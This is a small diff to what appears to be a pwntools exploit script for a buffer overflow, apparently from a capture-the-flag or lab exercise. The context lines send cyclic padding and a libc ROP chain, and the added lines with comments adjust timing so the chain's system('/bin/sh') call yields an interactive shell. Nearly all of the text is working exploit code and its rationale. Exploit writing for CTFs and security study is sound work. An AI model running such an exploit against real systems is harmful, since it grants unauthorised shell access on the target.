@@ -52,6 +52,12 @@ def main():
     io.recvuntil(b'name? ')
     payload = cyclic(find_offset()) + build_chain(libc_base) + b'\n'
     io.send(payload)
+    # The overflow is one greedy `read(0, name, 512)`.  Wait for the target's
+    # "hello, ..." echo (printed after read() returns, just before the chain
+    # fires `system("/bin/sh")`) so the single read() consumes *only* our
+    # payload; otherwise an immediately-following keystroke could be coalesced
+    # into that read() and eaten before the shell is listening.
+    io.recvline()
     io.interactive()                                   # ❼ shell if it worked
 
 if __name__ == '__main__':
